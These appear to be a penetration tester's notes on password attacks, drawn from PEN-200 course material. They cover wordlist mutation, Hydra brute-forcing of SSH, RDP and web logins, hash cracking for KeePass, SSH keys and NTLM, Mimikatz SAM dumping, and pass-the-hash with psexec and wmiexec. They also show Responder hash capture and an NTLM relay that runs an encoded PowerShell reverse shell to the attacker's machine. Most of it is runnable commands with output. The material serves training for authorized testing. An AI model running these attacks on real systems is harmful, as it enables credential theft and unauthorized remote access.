# Password Attacks

## CeWL

```
cewl -h
cewl http://10.10.140.34 -w output.txt
cewl http://10.10.140.34 -d 2 -w output1.txt
cewl http://10.10.140.34 -m 5 -x 10 -w output2.txt
```

1. Specify spidering depth: The `-d` option allows you to set how deep CeWL should spider. For example, to spider two links deep: `cewl http://10.10.140.34 -d 2 -w output1.txt`
2. Set minimum and maximum word length: Use the `-m` and `-x` options respectively. For instance, to get words between 5 and 10 characters: `cewl http://10.10.140.34 -m 5 -x 10 -w output2.txt`
3. Handle authentication: If the target site is behind a login, you can use the `-a` flag for form-based authentication.
4. Custom extensions: The `--with-numbers` option will append numbers to words, and using `--extension` allows you to append custom extensions to each word, making it useful for directory or file brute-forcing.
5. Follow external links: By default, CeWL doesn't spider external sites, but using the `--offsite` option allows you to do so.

## **Generate wordlists with hashcat**

The rules for hashcat are located under /usr/share/hashcat/rules

```
(kali㉿kali)-[/usr/share/hashcat/rules]
└─$ ll
total 2588
-rw-r--r-- 1 root root    933 Dec 23  2021 best64.rule
-rw-r--r-- 1 root root    666 Dec 23  2021 combinator.rule
-rw-r--r-- 1 root root 200188 Dec 23  2021 d3ad0ne.rule
-rw-r--r-- 1 root root 788063 Dec 23  2021 dive.rule
-rw-r--r-- 1 root root 483425 Dec 23  2021 generated2.rule
-rw-r--r-- 1 root root  78068 Dec 23  2021 generated.rule
drwxr-xr-x 2 root root  12288 Jun  9 03:51 hybrid
-rw-r--r-- 1 root root 309439 Dec 23  2021 Incisive-leetspeak.rule
-rw-r--r-- 1 root root  35280 Dec 23  2021 InsidePro-HashManager.rule
-rw-r--r-- 1 root root  19478 Dec 23  2021 InsidePro-PasswordsPro.rule
-rw-r--r-- 1 root root    298 Dec 23  2021 leetspeak.rule
-rw-r--r-- 1 root root   1280 Dec 23  2021 oscommerce.rule
-rw-r--r-- 1 root root 301161 Dec 23  2021 rockyou-30000.rule
-rw-r--r-- 1 root root   1563 Dec 23  2021 specific.rule
-rw-r--r-- 1 root root  64068 Dec 23  2021 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
-rw-r--r-- 1 root root   2027 Dec 23  2021 T0XlC-insert_space_and_special_0_F.rule
-rw-r--r-- 1 root root  34437 Dec 23  2021 T0XlC-insert_top_100_passwords_1_G.rule
-rw-r--r-- 1 root root  34813 Dec 23  2021 T0XlC.rule
-rw-r--r-- 1 root root 104203 Dec 23  2021 T0XlCv1.rule
-rw-r--r-- 1 root root     45 Dec 23  2021 toggles1.rule
-rw-r--r-- 1 root root    570 Dec 23  2021 toggles2.rule
-rw-r--r-- 1 root root   3755 Dec 23  2021 toggles3.rule
-rw-r--r-- 1 root root  16040 Dec 23  2021 toggles4.rule
-rw-r--r-- 1 root root  49073 Dec 23  2021 toggles5.rule
-rw-r--r-- 1 root root  55346 Dec 23  2021 unix-ninja-leetspeak.rule

```

Use rule and initial wordlist to create more wordlists

{% code title="" overflow="wrap" lineNumbers="true" %}
```
hashcat --force passwords.txt -r /usr/share/hashcat/rules/best64.rule --stdout > hashcat_pass.txt
```
{% endcode %}

### Mutating wordlists

The _Hashcat Wiki_ provides a list of all possible rule functions with examples. If we want to add a character, the simplest form is to prepend or append it. We can use the **$** function to append a character or **^** to prepend a character. Both of these functions expect one character after the function selector. For example, if we want to prepend a "3" to every password in a file, the corresponding rule function would be **^3**.

{% code title="Demo rule that contains $1 - simply will add "1" at the end of an existing word" overflow="wrap" lineNumbers="true" %}
```
echo \$1 > demo.rule
```
{% endcode %}

{% code title="Using Hashcat in debugging mode to display all mutated passwords" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~/passwordattacks$ hashcat -r demo.rule --stdout demo.txt
password1
iloveyou1
princess1
rockyou1
abc1231
```
{% endcode %}

When forced to use an upper case character in a password, many users tend to capitalize the first character. Therefore, we'll add the **c** rule function to our rule file, which capitalizes the first character and converts the rest to lower case.

{% code title="Using two rule functions separated by space and line" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~/passwordattacks$ cat demo1.rule     
$1 c
       
kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231

kali@kali:~/passwordattacks$ cat demo2.rule   
$1
c

kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
password1
Password
iloveyou1
Iloveyou
princess1
Princess
...
```
{% endcode %}

{% code title="Adding the rule function to the beginning and end of our current rule" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~/passwordattacks$ cat demo1.rule     
$1 c $!

kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!

kali@kali:~/passwordattacks$ cat demo2.rule   
$! $1 c

kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
Password!1
Iloveyou!1
Princess!1
Rockyou!1
Abc123!1
```
{% endcode %}

{% code title="Cracking a MD5 Hash with Hashcat and a mutated rockyou.txt wordlist" overflow="wrap" lineNumbers="true" %}
```
cat demo3.rule   
$1 c $!
$2 c $!
$1 $2 $3 c $!
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```
{% endcode %}

### Identify hashes

#### hash-identifier

#### hashid

```
hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC' --working
hashid "$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC" --NOT working
```

## Hashcat

```
hashcat --help | grep NTLM
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
                                                                                             
```

### NTLMv2 - LLMNR

```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

## Hydra

### SSH

\-t - number of threads;4 is suggested for SSH, 5 might work as well

{% code title="" overflow="wrap" lineNumbers="true" %}
```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
hydra -l root -P hashcat_pass.txt 71.132.12.14 -t 10 -V ssh
```
{% endcode %}

### **RDP**

{% code title="" overflow="wrap" lineNumbers="true" %}
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
{% endcode %}

### **Web login**

{% code title="" overflow="wrap" lineNumbers="true" %}
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.233.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
hydra -l '' -P 3digits.txt -f -v 10.10.185.105 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```
{% endcode %}

The command above will try one password after another in the `3digits.txt` file. It specifies the following:

* `-l ''` indicates that the login name is blank as the security lock only requires a password
* `-P 3digits.txt` specifies the password file to use
* `-f` stops Hydra after finding a working password
* `-v` provides verbose output and is helpful for catching errors
* `10.10.185.105` is the IP address of the target
* `http-post-form` specifies the HTTP method to use
* `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
  * `/login.php` is the page where the PIN code is submitted
  * `pin=^PASS^` will replace `^PASS^` with values from the password list
  * `Access denied` indicates that invalid passwords will lead to a page that contains the text “Access denied”
* `-s 8000` indicates the port number on the target

#### **HTTP Basic Authentication**

{% code title="HTTP Basic Authentication" overflow="wrap" lineNumbers="true" %}
```
hydra -I -V -P /usr/share/wordlists/rockyou.txt -t 1 "http-get://192.168.233.201/index.php:A=BASIC" -l admin
```
{% endcode %}

**Generate/Crack Hash**

`zip2john` will provide a hash for the password of the zip:

```
oxdf@parrot$ zip2john backup.zip > backup.zip.hash
```

That hash matches “PKZIP (Compressed Multi-File)”, or more 17220, on the Hashcat [example hashes](https://hashcat.net/wiki/doku.php?id=example\_hashes) page. It breaks in `hashcat` very quickly:

```
oxdf@parrot$ hashcat -m 17220 backup.zip.hash /usr/share/wordlists/rockyou.txt --user
```

**Example running hydra on DVWA.**

{% code overflow="wrap" %}
```
hydra 192.168.41.1 -l admin -P /usr/share/wordlists/rockyou.txt http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=low; PHPSESSID=pbns5vg0aqn8vu95bpdhf9boj9:F=Username and/or password incorrect."

```
{% endcode %}

## Keepass

Search file containing .kdbx

{% code title="" overflow="wrap" lineNumbers="true" %}
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
{% endcode %}

Copy file locally using impacket-smbserver or something else.

{% code title="Using keepass2john to format the KeePass database for Hashcat" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~/passwordattacks$ ls -la Database.kdbx
-rwxr--r-- 1 kali kali 1982 May 30 06:36 Database.kdbx


kali@kali:~/passwordattacks$ keepass2john Database.kdbx > keepass.hash   

kali@kali:~/passwordattacks$ cat keepass.hash   
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1

```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```
hashcat --help | grep -i "KeePass"
13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager
```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
hashcat (v6.2.5) starting
...
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
```
{% endcode %}

## SSH Private key Passphrase

{% code title="Using ssh2john to format the hash" overflow="wrap" lineNumbers="true" %}
```
chmod 600 id_rsa
ssh2john id_rsa > ssh.hash
cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...

```
{% endcode %}

Within this output, "$6$" signifies _SHA-512_.[1](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/password-cracking-fundamentals-45018/ssh-private-key-passphrase-44964#fn-local\_id\_766-1) As before, we'll remove the filename before the first colon. Then, we'll determine the correct Hashcat mode.

```
kali@kali:~/passwordattacks$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
hashcat (v6.2.5) starting
...

Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
No hashes loaded.
...
```

Unfortunately, we receive an error indicating that our hash caused a "Token length exception". When we research this with a search engine, several discussions[2](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/password-cracking-fundamentals-45018/ssh-private-key-passphrase-44964#fn-local\_id\_766-2) suggest that modern private keys and their corresponding passphrases are created with the _aes-256-ctr_[3](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/password-cracking-fundamentals-45018/ssh-private-key-passphrase-44964#fn-local\_id\_766-3) cipher, which Hashcat's mode 22921 does not support.

This reinforces the benefit of using multiple tools since John the Ripper (JtR) can handle this cipher.

To be able to use the previously created rules in JtR, we need to add a name for the rules and append them to the **/etc/john/john.conf** configuration file. For this demonstration, we'll name the rule **sshRules** with a "List.Rules" rule naming syntax (as shown in Listing 34). We'll use **sudo** and **sh -c** to append the contents of our rule file into **/etc/john/john.conf**.

{% code title="Adding the named rules to the JtR configuration file" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~/passwordattacks$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```
{% endcode %}



Now that we've successfully added our sshRules to the JtR configuration file, we can use **john** to crack the passphrase in the final step of our methodology. We'll define our wordlist with **--wordlist=ssh.passwords**, select the previously created rule with **--rules=sshRules**, and provide the hash of the private key as the final argument, **ssh.hash**.

{% code title="Cracking the hash with JtR" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Umbrella137!     (?)     
1g 0:00:00:00 DONE (2022-05-30 11:19) 1.785g/s 32.14p/s 32.14c/s 32.14C/s Window137!..Umbrella137#
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
{% endcode %}

## NTLM

### Cracking

efore we begin cracking NTLM hashes, let's discuss the NTLM hash implementation and how it is used. Then, we'll demonstrate how we can obtain and crack NTLM hashes in Windows.

Windows stores hashed user passwords in the _Security Account Manager_ (SAM)[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn1) database file, which is used to authenticate local or remote users.

To deter offline SAM database password attacks, Microsoft introduced the _SYSKEY_ feature in Windows NT 4.0 SP3, which partially encrypts the SAM file. The passwords can be stored in two different hash formats: _LAN Manager_ (LM)[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn2) and NTLM. LM is based on _DES_,[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn3) and is known to be very weak. For example, passwords are case insensitive and cannot exceed fourteen characters. If a password exceeds seven characters, it is split into two strings, each hashed separately. LM is disabled by default beginning with Windows Vista and Windows Server 2008.

On modern systems, the hashes in the SAM are stored as NTLM hashes. This hash implementation addresses many weaknesses of LM. For example, passwords are case-sensitive and are no longer split into smaller, weaker parts. However, NTLM hashes stored in the SAM database are not salted.

_Salts_[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn4) are random bits appended to a password before it is hashed. They are used to prevent an attack in which attackers pre-compute a list of hashes and then perform lookups on these precomputed hashes to infer the plaintext password. A list or table of precomputed passwords is called a _Rainbow Table_[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn5) and the corresponding attack is called a _Rainbow Table Attack_.

We use "NTLM hash" to refer to the formally correct _NTHash_. Since "NTLM hash" is more commonly used in our industry, we use it in this course to avoid confusion.

We cannot just copy, rename, or move the SAM database from **C:\Windows\system32\config\sam** while the Windows operating system is running because the kernel keeps an exclusive file system lock on the file.

Fortunately, we can use the _Mimikatz_[6](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn6) tool to do the heavy lifting for us and bypass this restriction. Mimikatz provides the functionality to extract plain-text passwords and password hashes from various sources in Windows and leverage them in further attacks like pass-the-hash.[7](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn7) Mimikatz also includes the _sekurlsa_ module, which extracts password hashes from the _Local Security Authority Subsystem_ (LSASS)[8](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn8) process memory. LSASS is a process in Windows that handles user authentication, password changes, and _access token_[9](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn9) creation.

LSASS is important for us because it caches NTLM hashes and other credentials, which we can extract using the sekurlsa Mimikatz module. We need to understand that LSASS runs under the SYSTEM user and is therefore even more privileged than a process started as Administrator.

Due to this, we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the _SeDebugPrivilege_[10](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn10) access right enabled. This access right grants us the ability to debug not only processes we own, but also all other users' processes.

We can also elevate our privileges to the _SYSTEM_ account with tools like _PsExec_[11](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn11) or the built-in Mimikatz _token elevation function_[12](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn12) to obtain the required privileges. The token elevation function requires the _SeImpersonatePrivilege_[13](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/password-attacks/working-with-password-hashes/cracking-ntlm#fn13) access right to work, but all local administrators have it by default.

{% code title="Enabling SeDebugPrivilege, elevating to SYSTEM user privileges and extracting NTLM hashes" overflow="wrap" lineNumbers="true" %}
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
 
mimikatz # lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000
 
RID  : 000003e9 (1001)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
 
RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
...
```
{% endcode %}

{% code title="NTLM hash of user nelly in nelly.hash and Hashcat mode" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~/passwordattacks$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.5) starting
...
3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
Time.Started.....: Thu Jun  2 04:11:28 2022, (0 secs)
Time.Estimated...: Thu Jun  2 04:11:28 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17926.2 kH/s (2.27ms) @ Accel:256 Loops:77 Thr:1 Vec:8
...

```
{% endcode %}

### Passing

Use mimikatz like before to extract the hash.

To leverage pass-the-hash (PtH), we need tools that support authentication with NTLM hashes. Fortunately for us, we have many to choose from. Let's review a few examples for different use cases. For SMB enumeration and management, we can use _smbclient_[2](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/passing-ntlm-44966#fn-local\_id\_979-2) or _CrackMapExec_.[3](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/passing-ntlm-44966#fn-local\_id\_979-3) For command execution, we can use the scripts from the _impacket_[4](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/passing-ntlm-44966#fn-local\_id\_979-4) library like _psexec.py_[5](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/passing-ntlm-44966#fn-local\_id\_979-5) and _wmiexec.py_.[6](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/passing-ntlm-44966#fn-local\_id\_979-6) We can also use NTLM hashes to not only connect to target systems with SMB, but also via other protocols like RDP and _WinRM_,[7](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/passing-ntlm-44966#fn-local\_id\_979-7) if the user has the required rights. We can also use Mimikatz to conduct pass-the-hash as well.

{% code title="Using smbclient with NTLM hash" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jun  2 16:55:37 2022
  ..                                DHS        0  Thu Jun  2 16:55:35 2022
  secrets.txt                         A        4  Thu Jun  2 11:34:47 2022

                4554239 blocks of size 4096. 771633 blocks available

smb: \> get secrets.txt
getting file \secrets.txt of size 4 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
{% endcode %}

{% code title=" Using psexec to get an interactive shell" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.50.212.....
[*] Found writable share ADMIN$
[*] Uploading file nvaXenHl.exe
[*] Opening SVCManager on 192.168.50.212.....
[*] Creating service MhCl on 192.168.50.212.....
[*] Starting service MhCl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
FILES02

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
   IPv4 Address. . . . . . . . . . . : 192.168.50.212
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> exit

kali@kali:~$
```
{% endcode %}

{% code title="Using wmiexec to get an interactive shell" overflow="wrap" lineNumbers="true" %}
```
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
files02\administrator

C:\>
```
{% endcode %}

## NTLMv2

### Cracking

The _Responder_ tool is excellent for this.[2](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/cracking-net-ntlmv2-44970#fn-local\_id\_1028-2) It includes a built-in SMB server that handles the authentication process for us and prints all captured Net-NTLMv2 hashes. While it also includes other protocol servers (including HTTP and FTP) as well as _Link-Local Multicast Name Resolution_ (LLMNR),[3](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/cracking-net-ntlmv2-44970#fn-local\_id\_1028-3) _NetBIOS Name Service_ (NBT-NS),[4](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/cracking-net-ntlmv2-44970#fn-local\_id\_1028-4) and _Multicast DNS_ (MDNS)[5](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/cracking-net-ntlmv2-44970#fn-local\_id\_1028-5) poisoning capabilities,[6](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/cracking-net-ntlmv2-44970#fn-local\_id\_1028-6) we'll focus on capturing Net-NTLMv2 hashes with the SMB server in this section.

```
sudo responder -I tap0 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
...
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
...
[+] Listening for events... 
```

```
C:\Windows\system32>dir \\192.168.119.2\test
dir \\192.168.119.2\test
Access is denied.
```

{% code title=" Responder capturing the Net-NTLMv2 Hash of paul" overflow="wrap" lineNumbers="true" %}
```
...
[+] Listening for events... 
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 

```
{% endcode %}

{% code title="Contents of paul.hash and Hashcat mode" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ cat paul.hash   
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E00480055005800430034005400490043000400340057...

kali@kali:~$ hashcat --help | grep -i "ntlm"
   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
   5600 | NetNTLMv2                                           | Network Protocol
  27100 | NetNTLMv2 (NT)                                      | Network Protocol
   1000 | NTLM                                                | Operating System

```
{% endcode %}

```
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

### Relaying

Let's get right into the attack by starting ntlmrelayx, which we can use with the pre-installed **impacket-ntlmrelayx** package. We'll use **--no-http-server** to disable the HTTP server since we are relaying an SMB connection and **-smb2support** to add support for _SMB2_.[3](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/relaying-net-ntlmv2-44969#fn-local\_id\_1064-3) We'll also use **-t** to set the target to FILES02. Finally, we'll set our command with **-c**, which will be executed on the target system as the relayed user. We'll use a PowerShell reverse shell one-liner,[4](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/relaying-net-ntlmv2-44969#fn-local\_id\_1064-4) which we'll base64-encode and execute with the **-enc** argument as we've done before in this course. We should note that the base64-encoded PowerShell reverse shell one-liner is shortened in the following listing, but it uses the IP of our Kali machine and port 8080 for the reverse shell to connect.

{% code title="Starting ntlmrelayx for a Relay-attack targeting FILES02" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections


```
{% endcode %}

{% code title="Starting a Netcat listener on port 8080" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ nc -nvlp 8080 
listening on [any] 8080 ...
```
{% endcode %}

{% code title="Using the dir command to create an SMB connection to our Kali machine" overflow="wrap" lineNumbers="true" %}
```
 nc 192.168.50.211 5555                                       
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
files01\files02admin

C:\Windows\system32>dir \\192.168.119.2\test
...
```
{% endcode %}

{% code title="Relay-attack to execute the reverse shell on FILES02" overflow="wrap" lineNumbers="true" %}
```
[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target smb://192.168.50.212
[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more targets left!
...
[*] Executed specified command on host: 192.168.50.212

```
{% endcode %}

{% code title="Incoming reverse shell" overflow="wrap" lineNumbers="true" %}
```
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.212] 49674
whoami
nt authority\system

PS C:\Windows\system32> hostname
FILES02

PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
   IPv4 Address. . . . . . . . . . . : 192.168.50.212
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
